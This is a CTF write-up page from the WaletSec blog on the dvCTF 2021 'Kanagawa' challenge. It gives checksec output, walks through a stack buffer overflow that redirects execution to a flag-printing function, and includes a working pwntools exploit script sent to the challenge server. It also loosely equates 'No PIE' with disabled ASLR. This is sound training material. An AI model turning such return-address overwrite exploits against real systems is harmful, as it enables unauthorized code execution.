<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>WaletSec - 2021-03-14-Kanagawa</title>
        <link rel="stylesheet" href="../css/default.css" />
        <link rel="stylesheet" href="../css/syntax.css" />
    </head>
    <body>
        <header>
            <div class="logo">
                <a href="../">WaletSec</a>
            </div>
            <nav>
                <a href="../">Home</a>
                <a href="../about.html">About</a>
                <a href="../contact.html">Contact</a>
                <a href="../archive.html">Archive</a>
            </nav>
        </header>

        <main role="main">
            <h1>2021-03-14-Kanagawa</h1>
            <article>
    <section class="header">
        Posted on March 14, 2021
        
    </section>
    <section>
        <h1 id="kanagawa">Kanagawa</h1>
<h3 id="solution">Solution</h3>
<p>We get executable file named kanagawa. After quickly loading it in favorite disassembler and taking a quick glance at the main function, we can assume that it’s a typical x86 buffer overflow. Let’s make sure there’s nothing weird going on with the binary by using checksec on it: $checksec –file=kanagawa</p>
<pre><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable    FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   75) Symbols      No    0        2        kanagawa</code></pre>
<p>It tells us that ASLR is disabled and there aren’t any other exploit mitigations enabled as well (except NX, but it won’t disturb us).</p>
<p>Let’s go back to disassembler. Buffer size in first fgets call is 45 (44, actually, because last byte is null terminator). We can also tell that we need exactly 40 bytes of padding + 4 bytes of return address to jump to. But where should we jump? Quick look at function list reveals one named recovery_mode. It executes system(“cat ./flag”), exactly what we need! Its address is 0x804851b (no ASLR, remember?).</p>
<p>I used an excellent framework called pwntools to get working exploit. Here is the code:</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a>context.update(arch<span class="op">=</span><span class="st">'i386'</span>, os<span class="op">=</span><span class="st">'linux'</span>)</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a><span class="co">#p = process('kanagawa')</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a>p <span class="op">=</span> remote(<span class="st">'challs.dvc.tf'</span>, <span class="dv">4444</span>)</span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true"></a></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true"></a>payload <span class="op">=</span> b<span class="st">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true"></a>payload <span class="op">+=</span> p32(<span class="bn">0x804851b</span>)</span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true"></a></span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true"></a>p.sendline(payload)</span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true"></a>p.interactive()</span></code></pre></div>
<h3 id="flag">Flag</h3>
<p><code>dvCTF{0v3rfl0w_tsun4m1}</code></p>
<h4 id="credits">Credits</h4>
<ul>
<li>Writeup by <a href="https://ctftime.org/user/85858">everl0stz</a></li>
<li>Solved by <a href="https://ctftime.org/user/85858">everl0stz</a></li>
<li>WaletSec 2021</li>
</ul>
<h4 id="license">License</h4>
<p><strong>CC BY 4.0</strong> WaletSec + everl0stz</p>
    </section>
</article>

        </main>

        <footer>
            <div>Source code available on 
                <a href="https://github.com/WaletSec/waletsec.github.io">GitHub</a></div>
            <div>Site proudly generated by
                <a href="http://jaspervdj.be/hakyll">Hakyll</a></div>
        </footer>
    </body>
</html>
